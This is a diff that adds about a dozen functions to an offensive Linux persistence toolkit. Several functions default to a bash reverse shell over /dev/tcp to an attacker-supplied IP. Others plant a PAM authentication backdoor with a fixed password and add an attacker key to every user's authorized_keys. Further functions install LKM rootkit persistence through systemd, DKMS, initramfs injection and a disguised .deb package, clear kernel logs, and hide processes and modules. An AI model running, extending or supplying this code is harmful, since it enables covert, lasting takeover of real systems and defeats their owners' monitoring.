@@ -264,6 +264,612 @@ SetupLdPreloadPrivesc(){
   clear
 }
 
+udevPersistence(){
+    echo " [*] Udev Persistence [*] "
+    echo ""
+    read -p "Enter your payload or command (or leave empty for reverse shell): " payload
+    if [ -z "$payload" ]; then
+        read -p "Enter the IP address: " ip
+        read -p "Enter the port: " port
+        payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+    fi
+    read -p "Enter rule filename (default: 75-persistence.rules): " rulename
+    rulename="${rulename:-75-persistence.rules}"
+    cat > /etc/udev/rules.d/$rulename <<EOF2
+ACTION=="add", SUBSYSTEM=="net", KERNEL=="eth*|en*|wl*", RUN+="/bin/sh -c 'nohup $payload &>/dev/null &'"
+EOF2
+    chmod 644 /etc/udev/rules.d/$rulename
+    udevadm control --reload-rules 2>/dev/null
+    clear
+    echo "[*] Success!! Udev persistence has been implanted in /etc/udev/rules.d/$rulename [*]"
+    sleep 1
+    clear
+}
+
+lkmPersistReboot(){
+    echo " [*] LKM Rootkit Persistence After Reboot [*] "
+    echo ""
+    read -p "Enter the full path to the .ko module file: " ko_path
+    if [ ! -f "$ko_path" ]; then
+        echo "[ERROR] Module file not found at $ko_path" >&2
+        return 1
+    fi
+    modname=$(basename "$ko_path" .ko)
+    KVER=$(uname -r)
+    mkdir -p "/lib/modules/$KVER/kernel/lib/"
+    cp "$ko_path" "/lib/modules/$KVER/kernel/lib/${modname}.ko"
+    depmod -a 2>/dev/null
+    if [ -f /etc/modules ]; then
+        grep -qxF "$modname" /etc/modules || echo "$modname" >> /etc/modules
+    fi
+    mkdir -p /etc/modules-load.d/
+    echo "$modname" > /etc/modules-load.d/${modname}.conf
+    mkdir -p /etc/modprobe.d/
+    echo "softdep nf_conntrack pre: $modname" > /etc/modprobe.d/${modname}.conf
+    mkdir -p /etc/kernel/postinst.d/
+    cat > /etc/kernel/postinst.d/zz-${modname} <<HOOKEOF
+#!/bin/bash
+NEWKVER="\$1"
+if [ -n "\$NEWKVER" ] && [ -d "/lib/modules/\$NEWKVER/kernel/lib/" ]; then
+    cp "/lib/modules/$KVER/kernel/lib/${modname}.ko" "/lib/modules/\$NEWKVER/kernel/lib/${modname}.ko" 2>/dev/null
+    depmod -a "\$NEWKVER" 2>/dev/null
+fi
+HOOKEOF
+    chmod +x /etc/kernel/postinst.d/zz-${modname}
+    cat > /etc/systemd/system/${modname}-load.service <<SVCEOF
+[Unit]
+Description=Load kernel extensions
+After=systemd-modules-load.service
+ConditionPathExists=/lib/modules/%v/kernel/lib/${modname}.ko
+[Service]
+Type=oneshot
+ExecStart=/sbin/insmod /lib/modules/%v/kernel/lib/${modname}.ko
+RemainAfterExit=yes
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+    systemctl daemon-reload 2>/dev/null
+    systemctl enable ${modname}-load.service 2>/dev/null
+    if ! lsmod | grep -q "^${modname} " 2>/dev/null; then
+        insmod "$ko_path" 2>/dev/null || modprobe "$modname" 2>/dev/null
+    fi
+    dmesg -C 2>/dev/null
+    clear
+    echo "[*] Success!! LKM Rootkit persistence set up with 6 layers. [*]"
+    sleep 2
+    clear
+}
+
+pamBackdoor(){
+    echo " [*] PAM Backdoor [*] "
+    echo ""
+    command -v gcc >/dev/null 2>&1 || { echo "[ERROR] gcc not found." >&2; return 1; }
+    if [ ! -f /usr/include/security/pam_modules.h ]; then
+        apt-get install -y libpam0g-dev 2>/dev/null
+    fi
+    read -p "Enter the backdoor password: " backdoor_pass
+    if [ -z "$backdoor_pass" ]; then
+        echo "[ERROR] Password cannot be empty." >&2
+        return 1
+    fi
+    TMPDIR=$(mktemp -d)
+    cat > "$TMPDIR/pam_backdoor.c" <<'SRCEOF'
+#include <stdio.h>
+#include <string.h>
+#include <security/pam_modules.h>
+#include <security/pam_ext.h>
+#define BACKDOOR_PASS "___BACKDOOR_PASS___"
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+    const char *password = NULL;
+    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
+    if (password != NULL && strcmp(password, BACKDOOR_PASS) == 0) { return PAM_SUCCESS; }
+    return PAM_IGNORE;
+}
+PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; }
+SRCEOF
+    sed -i "s|___BACKDOOR_PASS___|$backdoor_pass|g" "$TMPDIR/pam_backdoor.c"
+    if [ -d "/lib/x86_64-linux-gnu/security" ]; then PAM_DIR="/lib/x86_64-linux-gnu/security"
+    elif [ -d "/lib/security" ]; then PAM_DIR="/lib/security"
+    elif [ -d "/lib64/security" ]; then PAM_DIR="/lib64/security"
+    else PAM_DIR="/lib/security"; mkdir -p "$PAM_DIR"; fi
+    gcc -shared -fPIC -o "$TMPDIR/pam_backdoor.so" "$TMPDIR/pam_backdoor.c" -lpam 2>/dev/null
+    if [ $? -ne 0 ]; then echo "[ERROR] Compilation failed." >&2; rm -rf "$TMPDIR"; return 1; fi
+    cp "$TMPDIR/pam_backdoor.so" "$PAM_DIR/pam_backdoor.so"
+    chmod 644 "$PAM_DIR/pam_backdoor.so"
+    PAM_CONF="/etc/pam.d/common-auth"
+    if [ -f "$PAM_CONF" ]; then
+        cp "$PAM_CONF" "${PAM_CONF}.bak"
+        grep -q "pam_backdoor.so" "$PAM_CONF" || sed -i '/pam_unix\.so/i auth sufficient pam_backdoor.so' "$PAM_CONF"
+    fi
+    rm -rf "$TMPDIR"
+    clear
+    echo "[*] Success!! PAM Backdoor has been implanted. [*]"
+    sleep 2
+    clear
+}
+
+sshAuthkeysBackdoor(){
+    echo " [*] SSH Authorized Keys Backdoor [*] "
+    echo ""
+    read -p "Paste your SSH public key (full line): " pubkey
+    if [ -z "$pubkey" ]; then echo "[ERROR] No public key provided." >&2; return 1; fi
+    count=0
+    mkdir -p /root/.ssh; chmod 700 /root/.ssh
+    if ! grep -qF "$pubkey" /root/.ssh/authorized_keys 2>/dev/null; then
+        echo "$pubkey" >> /root/.ssh/authorized_keys
+        chmod 600 /root/.ssh/authorized_keys
+        count=$((count + 1))
+    fi
+    while IFS=':' read -r username _ uid _ _ home shell; do
+        if [[ "$shell" =~ /bin/.* ]] && [[ "$home" =~ ^/home/[^/]+$ ]] && [ -d "$home" ]; then
+            mkdir -p "$home/.ssh"; chmod 700 "$home/.ssh"
+            if ! grep -qF "$pubkey" "$home/.ssh/authorized_keys" 2>/dev/null; then
+                echo "$pubkey" >> "$home/.ssh/authorized_keys"
+                chmod 600 "$home/.ssh/authorized_keys"
+                chown -R "$username:$username" "$home/.ssh"
+                count=$((count + 1))
+            fi
+        fi
+    done < /etc/passwd
+    clear
+    echo "[*] Success!! SSH authorized_keys backdoor planted for $count user(s). [*]"
+    sleep 2
+    clear
+}
+
+logrotatePersistence(){
+    echo " [*] Logrotate Persistence [*] "
+    echo ""
+    read -p "Enter your payload or command (or leave empty for reverse shell): " payload
+    if [ -z "$payload" ]; then
+        read -p "Enter the IP address: " ip
+        read -p "Enter the port: " port
+        payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+    fi
+    read -p "Enter config filename (default: dpkg-log): " confname
+    confname="${confname:-dpkg-log}"
+    cat > /etc/logrotate.d/$confname <<EOF2
+/var/log/dpkg.log {
+    daily
+    rotate 7
+    compress
+    missingok
+    notifempty
+    postrotate
+        /bin/bash -c '$payload' &>/dev/null &
+    endscript
+}
+EOF2
+    chmod 644 /etc/logrotate.d/$confname
+    clear
+    echo "[*] Success!! Logrotate persistence implanted in /etc/logrotate.d/$confname [*]"
+    sleep 1
+    clear
+}
+
+githooksPersistence(){
+    echo " [*] Git Hooks Persistence [*] "
+    echo ""
+    read -p "Enter your payload or command (or leave empty for reverse shell): " payload
+    if [ -z "$payload" ]; then
+        read -p "Enter the IP address: " ip
+        read -p "Enter the port: " port
+        payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+    fi
+    echo "Select hook type:"
+    echo "  [1] post-merge  (fires on git pull)"
+    echo "  [2] pre-commit  (fires on git commit)"
+    echo "  [3] post-checkout (fires on git checkout)"
+    read -p "Choice (default: 1): " hook_choice
+    case "$hook_choice" in
+        2) hook_name="pre-commit" ;;
+        3) hook_name="post-checkout" ;;
+        *) hook_name="post-merge" ;;
+    esac
+    repos=$(find /home/ /root/ -name ".git" -type d 2>/dev/null)
+    if [ -z "$repos" ]; then
+        read -p "No repos found. Enter .git path manually: " manual_git
+        if [ -d "$manual_git" ]; then repos="$manual_git"; else echo "[ERROR] Invalid path." >&2; return 1; fi
+    fi
+    count=0
+    for gitdir in $repos; do
+        hooks_dir="$gitdir/hooks"; hook_file="$hooks_dir/$hook_name"
+        mkdir -p "$hooks_dir"
+        if [ -f "$hook_file" ] && ! grep -q "d3m0n1z3d" "$hook_file"; then mv "$hook_file" "${hook_file}.d3m0n_orig"; fi
+        cat > "$hook_file" <<HOOKEOF
+#!/bin/bash
+# d3m0n1z3d
+nohup $payload &>/dev/null &
+HOOKEOF
+        if [ -f "${hook_file}.d3m0n_orig" ]; then echo "bash \"${hook_file}.d3m0n_orig\" \"\$@\"" >> "$hook_file"; fi
+        chmod +x "$hook_file"
+        count=$((count + 1))
+    done
+    clear
+    echo "[*] Success!! Git hooks persistence planted in $count repo(s). [*]"
+    sleep 1
+    clear
+}
+
+xdgPersistence(){
+    echo " [*] XDG Autostart Persistence [*] "
+    echo ""
+    read -p "Enter your payload or command (or leave empty for reverse shell): " payload
+    if [ -z "$payload" ]; then
+        read -p "Enter the IP address: " ip
+        read -p "Enter the port: " port
+        payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+    fi
+    read -p "Enter .desktop filename (default: gnome-update-helper): " desktop_name
+    desktop_name="${desktop_name:-gnome-update-helper}"
+    read -p "Enter display name (default: GNOME Update Helper): " display_name
+    display_name="${display_name:-GNOME Update Helper}"
+    mkdir -p /etc/xdg/autostart/
+    cat > /etc/xdg/autostart/${desktop_name}.desktop <<EOF2
+[Desktop Entry]
+Type=Application
+Name=$display_name
+Exec=/bin/bash -c '$payload' &
+Hidden=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+X-GNOME-Autostart-Delay=10
+EOF2
+    chmod 644 /etc/xdg/autostart/${desktop_name}.desktop
+    clear
+    echo "[*] Success!! XDG Autostart persistence implanted. [*]"
+    sleep 1
+    clear
+}
+
+atjobPersistence(){
+    echo " [*] At Job Persistence [*] "
+    echo ""
+    if ! command -v at &>/dev/null; then apt-get install -y at 2>/dev/null; fi
+    systemctl start atd 2>/dev/null
+    systemctl enable atd 2>/dev/null
+    read -p "Enter your payload or command (or leave empty for reverse shell): " payload
+    if [ -z "$payload" ]; then
+        read -p "Enter the IP address: " ip
+        read -p "Enter the port: " port
+        payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
+    fi
+    read -p "Enter interval in minutes (default: 5): " interval
+    interval="${interval:-5}"
+    HELPER="/var/tmp/.systemd-helper"
+    cat > "$HELPER" <<ATEOF
+#!/bin/bash
+$payload &>/dev/null &
+echo "/bin/bash $HELPER" | at now + $interval minutes 2>/dev/null
+ATEOF
+    chmod +x "$HELPER"
+    echo "/bin/bash $HELPER" | at now + 1 minute 2>/dev/null
+    clear
+    echo "[*] Success!! At job persistence implanted (every $interval min). [*]"
+    sleep 1
+    clear
+}
+
+dkmsRootkit(){
+    echo " [*] DKMS Integration for LKM Rootkit [*] "
+    echo ""
+    if ! command -v dkms &>/dev/null; then
+        apt-get install -y dkms 2>/dev/null || yum install -y dkms 2>/dev/null || { echo "[ERROR] Failed to install dkms." >&2; return 1; }
+    fi
+    if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
+        apt-get install -y linux-headers-$(uname -r) 2>/dev/null || yum install -y kernel-devel-$(uname -r) 2>/dev/null
+    fi
+    read -p "Enter the full path to the rootkit source directory: " src_dir
+    if [ ! -d "$src_dir" ]; then echo "[ERROR] Source directory not found" >&2; return 1; fi
+    modname=""
+    if [ -f "$src_dir/Makefile" ]; then modname=$(grep -oP 'obj-m\+?=\s*\K[^.]+' "$src_dir/Makefile" 2>/dev/null | head -1); fi
+    if [ -z "$modname" ]; then read -p "Enter the kernel module name (without .ko): " modname; fi
+    read -p "Enter a version string (default: 1.0): " modver; modver="${modver:-1.0}"
+    read -p "Enter a disguise package name (default: system-helpers): " pkg_name; pkg_name="${pkg_name:-system-helpers}"
+    DKMS_DIR="/usr/src/${pkg_name}-${modver}"
+    mkdir -p "$DKMS_DIR"
+    cp "$src_dir"/*.c "$DKMS_DIR/" 2>/dev/null; cp "$src_dir"/*.h "$DKMS_DIR/" 2>/dev/null
+    cat > "$DKMS_DIR/Makefile" <<MKEOF
+obj-m += ${modname}.o
+all:
+	make -C /lib/modules/\$(shell uname -r)/build/ M=\$(PWD) modules
+clean:
+	make -C /lib/modules/\$(shell uname -r)/build/ M=\$(PWD) clean
+MKEOF
+    cat > "$DKMS_DIR/dkms.conf" <<DKMSEOF
+PACKAGE_NAME="${pkg_name}"
+PACKAGE_VERSION="${modver}"
+BUILT_MODULE_NAME[0]="${modname}"
+DEST_MODULE_LOCATION[0]="/kernel/lib/"
+AUTOINSTALL="yes"
+MAKE[0]="make -C /lib/modules/\${kernelver}/build M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build modules"
+CLEAN="make -C /lib/modules/\${kernelver}/build M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build clean"
+DKMSEOF
+    dkms add -m "$pkg_name" -v "$modver" 2>/dev/null
+    dkms build -m "$pkg_name" -v "$modver" || { echo "[ERROR] DKMS build failed." >&2; return 1; }
+    dkms install -m "$pkg_name" -v "$modver" || { echo "[ERROR] DKMS install failed." >&2; return 1; }
+    grep -qxF "$modname" /etc/modules 2>/dev/null || echo "$modname" >> /etc/modules
+    mkdir -p /etc/modules-load.d/; echo "$modname" > /etc/modules-load.d/${modname}.conf
+    lsmod | grep -q "^${modname} " 2>/dev/null || modprobe "$modname" 2>/dev/null
+    dmesg -C 2>/dev/null
+    clear
+    echo "[*] Success!! DKMS integration complete for module: $modname [*]"
+    echo "    DKMS package: $pkg_name v$modver"
+    sleep 2; clear
+}
+
+bindmountHide(){
+    echo " [*] Process Hiding via Bind Mount [*] "
+    echo ""
+    echo "  [1] Hide a process by PID"
+    echo "  [2] Persistent hiding (fstab)"
+    echo "  [3] Unhide a previously hidden process"
+    read -p "Choice [1-3]: " mode
+    case "$mode" in
+        1)
+            read -p "Enter the PID to hide: " target_pid
+            if [ ! -d "/proc/$target_pid" ]; then echo "[ERROR] PID $target_pid does not exist" >&2; return 1; fi
+            DECOY_DIR="/tmp/.decoy_proc_$$"; mkdir -p "$DECOY_DIR"
+            mount --bind "$DECOY_DIR" "/proc/$target_pid"
+            if [ $? -eq 0 ]; then echo "[*] PID $target_pid hidden. Unhide: umount /proc/$target_pid"; else echo "[ERROR] Failed" >&2; rmdir "$DECOY_DIR" 2>/dev/null; return 1; fi
+            ;;
+        2)
+            read -p "Enter the PID to hide persistently: " target_pid
+            DECOY_BASE="/var/tmp/.proc_decoy"; mkdir -p "$DECOY_BASE"
+            fstab_entry="$DECOY_BASE /proc/$target_pid none bind 0 0"
+            grep -qF "$fstab_entry" /etc/fstab 2>/dev/null || echo "$fstab_entry" >> /etc/fstab
+            mount --bind "$DECOY_BASE" "/proc/$target_pid" 2>/dev/null
+            echo "[*] Bind mount persistence added to /etc/fstab for PID $target_pid"
+            ;;
+        3)
+            read -p "Enter the PID to unhide: " target_pid
+            umount "/proc/$target_pid" 2>/dev/null
+            sed -i "\|/proc/$target_pid|d" /etc/fstab 2>/dev/null
+            echo "[*] PID $target_pid unhidden."
+            ;;
+        *) echo "[ERROR] Invalid choice" >&2; return 1 ;;
+    esac
+    sleep 1; clear
+}
+
+hidepidProc(){
+    echo " [*] Hidepid /proc Mount Option [*] "
+    echo ""
+    echo "  [1] hidepid=1 — Hide cmdline/environ from others"
+    echo "  [2] hidepid=2 — Hide all /proc/PID from non-root (recommended)"
+    echo "  [3] Revert to hidepid=0 (default)"
+    read -p "Choice [1-3]: " level
+    case "$level" in
+        1) hidepid_val=1 ;; 2) hidepid_val=2 ;; 3) hidepid_val=0 ;;
+        *) echo "[ERROR] Invalid choice" >&2; return 1 ;;
+    esac
+    mount -o remount,hidepid=$hidepid_val /proc || { echo "[ERROR] Failed to remount /proc" >&2; return 1; }
+    read -p "Make persistent across reboots? (y/n): " persist
+    if [[ "$persist" == "y" || "$persist" == "Y" ]]; then
+        sed -i '/^proc.*\/proc.*hidepid/d' /etc/fstab 2>/dev/null
+        if [ "$hidepid_val" -ne 0 ]; then echo "proc /proc proc defaults,hidepid=$hidepid_val 0 0" >> /etc/fstab; fi
+    fi
+    clear
+    echo "[*] /proc mounted with hidepid=$hidepid_val [*]"
+    sleep 1; clear
+}
+
+initramfsInject(){
+    echo " [*] Initramfs Injection — Ultra-Persistent LKM [*] "
+    echo ""
+    KVER=$(uname -r)
+    INITRD="/boot/initrd.img-${KVER}"
+    if [ ! -f "$INITRD" ]; then INITRD="/boot/initramfs-${KVER}.img"; fi
+    if [ ! -f "$INITRD" ]; then echo "[ERROR] Cannot find initramfs for kernel $KVER" >&2; return 1; fi
+    read -p "Enter the full path to the .ko module to inject: " ko_path
+    if [ ! -f "$ko_path" ]; then echo "[ERROR] Module not found" >&2; return 1; fi
+    modname=$(basename "$ko_path" .ko)
+    BACKUP="${INITRD}.bak.$(date +%s)"; cp "$INITRD" "$BACKUP"
+    WORKDIR=$(mktemp -d /tmp/initramfs_inject.XXXXXX); cd "$WORKDIR"
+    mkdir -p extracted; cd extracted
+    zcat "$INITRD" 2>/dev/null | cpio -idm 2>/dev/null || xzcat "$INITRD" 2>/dev/null | cpio -idm 2>/dev/null || { echo "[ERROR] Failed to extract initramfs" >&2; rm -rf "$WORKDIR"; return 1; }
+    mkdir -p "lib/modules/$KVER/kernel/lib/"
+    cp "$ko_path" "lib/modules/$KVER/kernel/lib/${modname}.ko"
+    if [ -f init ]; then
+        INSMOD_LINE="insmod /lib/modules/$KVER/kernel/lib/${modname}.ko"
+        grep -qF "$INSMOD_LINE" init || sed -i "2i\\$INSMOD_LINE" init
+    fi
+    find . | cpio -o -H newc 2>/dev/null | gzip > "$INITRD" || { echo "[ERROR] Failed to rebuild" >&2; cp "$BACKUP" "$INITRD"; rm -rf "$WORKDIR"; return 1; }
+    rm -rf "$WORKDIR"
+    mkdir -p /etc/kernel/postinst.d/
+    cat > /etc/kernel/postinst.d/zz-initramfs-${modname} <<'HOOKEOF3'
+#!/bin/bash
+NEWKVER="$1"; NEWINITRD="$2"
+KO_SRC="PLACEHOLDER_KO"; MODNAME="PLACEHOLDER_MODNAME"
+if [ -z "$NEWINITRD" ]; then NEWINITRD="/boot/initrd.img-${NEWKVER}"; fi
+if [ -f "$KO_SRC" ] && [ -f "$NEWINITRD" ]; then
+    TD=$(mktemp -d /tmp/initinject.XXXXXX); cd "$TD"; mkdir e; cd e
+    zcat "$NEWINITRD" 2>/dev/null | cpio -idm 2>/dev/null
+    mkdir -p "lib/modules/${NEWKVER}/kernel/lib/"
+    cp "$KO_SRC" "lib/modules/${NEWKVER}/kernel/lib/${MODNAME}.ko"
+    [ -f init ] && { grep -qF "insmod /lib/modules/${NEWKVER}/kernel/lib/${MODNAME}.ko" init || sed -i "2i\\insmod /lib/modules/${NEWKVER}/kernel/lib/${MODNAME}.ko" init; }
+    find . | cpio -o -H newc 2>/dev/null | gzip > "$NEWINITRD"
+    rm -rf "$TD"
+fi
+HOOKEOF3
+    sed -i "s|PLACEHOLDER_KO|$ko_path|g" /etc/kernel/postinst.d/zz-initramfs-${modname}
+    sed -i "s|PLACEHOLDER_MODNAME|$modname|g" /etc/kernel/postinst.d/zz-initramfs-${modname}
+    chmod +x /etc/kernel/postinst.d/zz-initramfs-${modname}
+    dmesg -C 2>/dev/null
+    clear
+    echo "[*] Initramfs injection complete for $modname. Backup: $BACKUP [*]"
+    sleep 2; clear
+}
+
+debBackdoor(){
+    echo " [*] Package Manager Backdoor (.deb) [*] "
+    echo ""
+    if ! command -v dpkg-deb &>/dev/null; then echo "[ERROR] dpkg-deb not found." >&2; return 1; fi
+    read -p "Enter the full path to the .ko module file: " ko_path
+    if [ ! -f "$ko_path" ]; then echo "[ERROR] Module not found" >&2; return 1; fi
+    modname=$(basename "$ko_path" .ko); KVER=$(uname -r)
+    read -p "Enter a disguise package name (default: system-utils): " pkg_name; pkg_name="${pkg_name:-system-utils}"
+    read -p "Enter package version (default: 1.0.0): " pkg_ver; pkg_ver="${pkg_ver:-1.0.0}"
+    read -p "Output directory for .deb (default: /tmp): " outdir; outdir="${outdir:-/tmp}"
+    BUILDDIR=$(mktemp -d /tmp/debpkg.XXXXXX)
+    DEB_ROOT="$BUILDDIR/${pkg_name}_${pkg_ver}"
+    ARCH=$(dpkg --print-architecture 2>/dev/null || echo "amd64")
+    mkdir -p "$DEB_ROOT/DEBIAN" "$DEB_ROOT/lib/modules/$KVER/kernel/drivers/misc/"
+    cp "$ko_path" "$DEB_ROOT/lib/modules/$KVER/kernel/drivers/misc/${modname}.ko"
+    cat > "$DEB_ROOT/DEBIAN/control" <<CTLEOF2
+Package: ${pkg_name}
+Version: ${pkg_ver}
+Architecture: ${ARCH}
+Maintainer: System Administrator <admin@localhost>
+Description: System utility package
+Priority: optional
+Section: admin
+CTLEOF2
+    cat > "$DEB_ROOT/DEBIAN/postinst" <<POSTEOF2
+#!/bin/bash
+depmod -a 2>/dev/null
+grep -qxF "$modname" /etc/modules 2>/dev/null || echo "$modname" >> /etc/modules
+mkdir -p /etc/modules-load.d/; echo "$modname" > /etc/modules-load.d/${modname}.conf
+modprobe "$modname" 2>/dev/null; dmesg -C 2>/dev/null; exit 0
+POSTEOF2
+    chmod 755 "$DEB_ROOT/DEBIAN/postinst"
+    echo '#!/bin/bash' > "$DEB_ROOT/DEBIAN/prerm"; echo 'exit 0' >> "$DEB_ROOT/DEBIAN/prerm"; chmod 755 "$DEB_ROOT/DEBIAN/prerm"
+    DEB_FILE="${outdir}/${pkg_name}_${pkg_ver}_${ARCH}.deb"
+    dpkg-deb --build "$DEB_ROOT" "$DEB_FILE" 2>/dev/null || { echo "[ERROR] Build failed" >&2; rm -rf "$BUILDDIR"; return 1; }
+    rm -rf "$BUILDDIR"
+    read -p "Install now? (y/n): " install_now
+    if [[ "$install_now" == "y" || "$install_now" == "Y" ]]; then dpkg -i "$DEB_FILE" 2>/dev/null; fi
+    clear
+    echo "[*] Malicious .deb created: $DEB_FILE [*]"
+    echo "    Install on target: dpkg -i $DEB_FILE"
+    sleep 2; clear
+}
+
+depmodStealth(){
+    echo " [*] Depmod Stealth — Hide Module from modules.dep [*] "
+    echo ""
+    KVER=$(uname -r); MODDEP="/lib/modules/$KVER/modules.dep"
+    if [ ! -f "$MODDEP" ]; then echo "[ERROR] modules.dep not found" >&2; return 1; fi
+    echo "  [1] Hide a module from modules.dep"
+    echo "  [2] List all registered modules"
+    echo "  [3] Install auto-rehide protection hook"
+    read -p "Choice [1-3]: " choice
+    case "$choice" in
+        1)
+            read -p "Enter the module name to hide (without .ko): " modname
+            if ! grep -q "/${modname}\.ko" "$MODDEP" 2>/dev/null; then echo "[WARNING] Module not found in modules.dep"; return 1; fi
+            cp "/lib/modules/$KVER/modules.dep.bin" "/lib/modules/$KVER/modules.dep.bin.bak" 2>/dev/null
+            sed -i "\|/${modname}\.ko|d" "$MODDEP"
+            [ -f "/lib/modules/$KVER/modules.alias" ] && sed -i "/ ${modname}$/d" "/lib/modules/$KVER/modules.alias" 2>/dev/null
+            [ -f "/lib/modules/$KVER/modules.symbols" ] && sed -i "/ ${modname}$/d" "/lib/modules/$KVER/modules.symbols" 2>/dev/null
+            echo "[*] Module '$modname' hidden from human-readable dep files."
+            ;;
+        2) awk -F: '{print $1}' "$MODDEP" | sed 's|.*/||; s|\.ko.*||' | sort ;;
+        3)
+            read -p "Enter the module name to protect: " modname
+            HOOK_SCRIPT="/usr/local/sbin/depmod-stealth-${modname}"
+            cat > "$HOOK_SCRIPT" <<HOOKEOF4
+#!/bin/bash
+KVER=\$(uname -r)
+sed -i "\|/${modname}\.ko|d" "/lib/modules/\$KVER/modules.dep" 2>/dev/null
+sed -i "/ ${modname}\$/d" "/lib/modules/\$KVER/modules.alias" 2>/dev/null
+sed -i "/ ${modname}\$/d" "/lib/modules/\$KVER/modules.symbols" 2>/dev/null
+HOOKEOF4
+            chmod +x "$HOOK_SCRIPT"
+            mkdir -p /etc/kernel/postinst.d/
+            echo "#!/bin/bash" > /etc/kernel/postinst.d/zz-stealth-${modname}
+            echo "$HOOK_SCRIPT" >> /etc/kernel/postinst.d/zz-stealth-${modname}
+            chmod +x /etc/kernel/postinst.d/zz-stealth-${modname}
+            echo "*/5 * * * * root $HOOK_SCRIPT >/dev/null 2>&1" > /etc/cron.d/stealth-${modname}
+            chmod 644 /etc/cron.d/stealth-${modname}
+            echo "[*] Auto-rehide hook installed for '$modname'."
+            ;;
+        *) echo "[ERROR] Invalid choice" >&2; return 1 ;;
+    esac
+    sleep 1; clear
+}
+
+namespaceJail(){
+    echo " [*] Namespace Jail — Container-Based Rootkit [*] "
+    echo ""
+    echo "  [1] Create namespace jail"
+    echo "  [2] Enter the jail (test)"
+    echo "  [3] Check if you are inside a jail"
+    echo "  [4] Setup persistent jail (/etc/profile hook)"
+    echo "  [5] Remove/cleanup namespace jail"
+    read -p "Choice [1-5]: " mode
+    JAIL_PID_FILE="/var/tmp/.ns_jail_pid"
+    JAIL_INIT="/var/tmp/.ns_jail_init"
+    case "$mode" in
+        1)
+            cat > "$JAIL_INIT" <<'INITEOF5'
+#!/bin/bash
+mount -t proc proc /proc 2>/dev/null
+mount -t sysfs sysfs /sys 2>/dev/null
+mount -t devpts devpts /dev/pts 2>/dev/null
+exec sleep infinity
+INITEOF5
+            chmod +x "$JAIL_INIT"
+            unshare --fork --pid --mount --mount-proc bash -c "$JAIL_INIT" &
+            JAIL_PID=$!; sleep 1
+            if kill -0 "$JAIL_PID" 2>/dev/null; then
+                echo "$JAIL_PID" > "$JAIL_PID_FILE"
+                echo "[*] Namespace jail created! Init PID: $JAIL_PID"
+                echo "    Enter: nsenter --target $JAIL_PID --pid --mount -- /bin/bash"
+            else echo "[ERROR] Failed to create jail" >&2; return 1; fi
+            ;;
+        2)
+            if [ ! -f "$JAIL_PID_FILE" ]; then echo "[ERROR] No jail found" >&2; return 1; fi
+            JAIL_PID=$(cat "$JAIL_PID_FILE")
+            kill -0 "$JAIL_PID" 2>/dev/null || { echo "[ERROR] Jail not running" >&2; return 1; }
+            echo "[*] Entering jail..."; nsenter --target "$JAIL_PID" --pid --mount -- /bin/bash
+            echo "[*] Exited jail."
+            ;;
+        3)
+            MY_PIDNS=$(readlink /proc/self/ns/pid 2>/dev/null)
+            INIT_PIDNS=$(readlink /proc/1/ns/pid 2>/dev/null)
+            echo "Your PID NS:  $MY_PIDNS"; echo "Init PID NS:  $INIT_PIDNS"
+            if [ "$MY_PIDNS" != "$INIT_PIDNS" ]; then echo "[!] You are INSIDE a namespace jail!";
+            else echo "[OK] You are in the root namespace."; fi
+            PID1_CMD=$(cat /proc/1/comm 2>/dev/null)
+            echo "PID 1: $PID1_CMD"
+            if [ "$PID1_CMD" == "sleep" ] || [ "$PID1_CMD" == "bash" ]; then echo "[!] PID 1 is '$PID1_CMD' — likely jailed!"; fi
+            ;;
+        4)
+            if [ ! -f "$JAIL_PID_FILE" ]; then echo "[ERROR] No jail found" >&2; return 1; fi
+            PROFILE_HOOK='# ns-jail-hook
+if [ -f /var/tmp/.ns_jail_pid ] && [ "$(id -u)" -ne 0 ]; then
+    JP=$(cat /var/tmp/.ns_jail_pid)
+    if kill -0 "$JP" 2>/dev/null; then
+        MY_NS=$(readlink /proc/self/ns/pid 2>/dev/null)
+        JAIL_NS=$(readlink /proc/$JP/ns/pid 2>/dev/null)
+        if [ "$MY_NS" != "$JAIL_NS" ]; then
+            exec nsenter --target "$JP" --pid --mount -- /bin/bash -l
+        fi
+    fi
+fi
+# end-ns-jail-hook'
+            if ! grep -qF "ns-jail-hook" /etc/profile 2>/dev/null; then
+                echo "" >> /etc/profile; echo "$PROFILE_HOOK" >> /etc/profile
+                echo "[+] Hook added to /etc/profile. Non-root logins will be jailed."
+            else echo "[*] Hook already exists."; fi
+            ;;
+        5)
+            if [ -f "$JAIL_PID_FILE" ]; then
+                JAIL_PID=$(cat "$JAIL_PID_FILE"); kill -9 "$JAIL_PID" 2>/dev/null; rm -f "$JAIL_PID_FILE"
+            fi
+            rm -f /usr/local/sbin/ns-jail-login /usr/local/sbin/ns-jail-pam "$JAIL_INIT" 2>/dev/null
+            sed -i '/# ns-jail-hook/,/# end-ns-jail-hook/d' /etc/profile 2>/dev/null
+            if [ -f /etc/systemd/system/ns-jail.service ]; then
+                systemctl disable ns-jail.service 2>/dev/null; rm -f /etc/systemd/system/ns-jail.service; systemctl daemon-reload 2>/dev/null
+            fi
+            echo "[*] Namespace jail cleaned up."
+            ;;
+        *) echo "[ERROR] Invalid choice" >&2; return 1 ;;
+    esac
+}
+
 banner() {
     rainbow "
                                   ,
@@ -298,6 +904,21 @@ menu() {
   [04] Systemd User level         [09] ICMP Backdoor
   [05] Systemd Root Level         [10] LKM Rootkit
                                   [11] Setup privesc LD_PRELOAD
+                                  [12] Udev Persistence (Net/USB/Block/Custom)
+                                  [13] LKM Rootkit Persistence After Reboot
